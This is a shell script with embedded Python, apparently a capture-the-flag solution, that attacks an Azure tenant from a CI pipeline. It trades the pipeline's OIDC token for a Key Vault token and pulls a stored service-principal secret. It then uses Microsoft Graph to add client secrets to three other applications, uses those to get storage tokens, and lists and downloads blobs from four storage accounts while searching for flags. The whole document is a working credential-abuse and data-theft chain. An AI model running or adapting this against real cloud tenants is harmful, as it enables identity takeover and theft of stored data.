#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, re, time, urllib.request, urllib.parse
def http(url, data=None, headers=None, method=None, js=None):
    h=dict(headers or {}); body=None
    if js is not None: body=json.dumps(js).encode(); h["Content-Type"]="application/json"
    elif isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    req=urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]
G="https://graph.microsoft.com/v1.0"
FLAG=re.compile(rb"(DF26\{[^}]{0,300}\}|flag\{[^}]{0,300}\}|FLAG\{[^}]{0,300}\})", re.I)
ACCTS=["sttblappcfgprodx3euoz","sttblbackupprodx3euoz","sttblarchiveprodx3euoz","sttblcilogsprodx3euoz"]
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,
  "scope":"https://vault.azure.net/.default","grant_type":"client_credentials",
  "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":IDT})
KVT=jg(b)["access_token"]
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4",
          headers={"Authorization":"Bearer "+KVT})
sc=json.loads(jg(b)["value"])
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
  {"client_id":sc["appId"],"client_secret":sc["clientSecret"],
   "scope":"https://graph.microsoft.com/.default","grant_type":"client_credentials"})
HS={"Authorization":"Bearer "+jg(b)["access_token"]}

TARGETS=[("tbl-legacy-admin","891fb158-e02c-4428-a885-53b811f369c0","22a3fb7e-860a-4708-9e50-3d36aa21191c"),
         ("tbl-directory-sync","7c2e61eb-f928-45cd-99c9-20da958dd216","1f07dd31-a868-4c19-9c85-a50b9700f88f"),
         ("tbl-reporting-insights","6eb124e3-de61-4fc9-a124-213d98d737f5","317eef12-bc80-4c7c-9916-4b2ffcbeb15d")]
for name, appid, objid in TARGETS:
    kid=None
    try:
        st,b=http(f"{G}/applications/{objid}/addPassword", headers=HS, method="POST",
                  js={"passwordCredential":{"displayName":"ci-temp"}})
        if st not in (200,201): print(f"\n### {name}: addPassword {st}"); continue
        pc=jg(b); kid=pc["keyId"]; SEC=pc["secretText"]
        print(f"\n### {name}: waiting for credential", flush=True)
        t=None
        for i in range(14):
            time.sleep(10)
            st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
                      {"client_id":appid,"client_secret":SEC,
                       "scope":"https://storage.azure.com/.default","grant_type":"client_credentials"})
            t=jg(b).get("access_token")
            if t: print(f"    token ready after {(i+1)*10}s"); break
        if not t:
            print("    never got a storage token"); continue
        H={"Authorization":"Bearer "+t,"x-ms-version":"2021-08-06"}
        for a in ACCTS:
            st,b=http(f"https://{a}.blob.core.windows.net/?comp=list", headers=H)
            if st!=200:
                print(f"    {a:24} account-list {st}"); continue
            conts=[x.decode() for x in re.findall(rb"<Name>([^<]+)</Name>", b)]
            print(f"    {a:24} containers={conts}")
            for cn in conts:
                st2,b2=http(f"https://{a}.blob.core.windows.net/{cn}?restype=container&comp=list", headers=H)
                if st2!=200:
                    print(f"        {cn}: blob-list {st2}"); continue
                blobs=[x.decode() for x in re.findall(rb"<Name>([^<]+)</Name>", b2)]
                print(f"        {cn}: {blobs[:25]}")
                for bl in blobs[:30]:
                    st3,bb=http(f"https://{a}.blob.core.windows.net/{cn}/{urllib.parse.quote(bl)}", headers=H)
                    if st3==200:
                        m=FLAG.search(bb)
                        if m: print(f"           >>> FLAG {a}/{cn}/{bl}: {m.group(1).decode()}")
                        else: print(f"           {bl} ({len(bb)}b): {bb[:150]}")
    finally:
        if kid:
            st,b=http(f"{G}/applications/{objid}/removePassword", headers=HS, method="POST", js={"keyId":kid})
            print(f"    cleanup: {st}")
PYEOF
echo "=== done ==="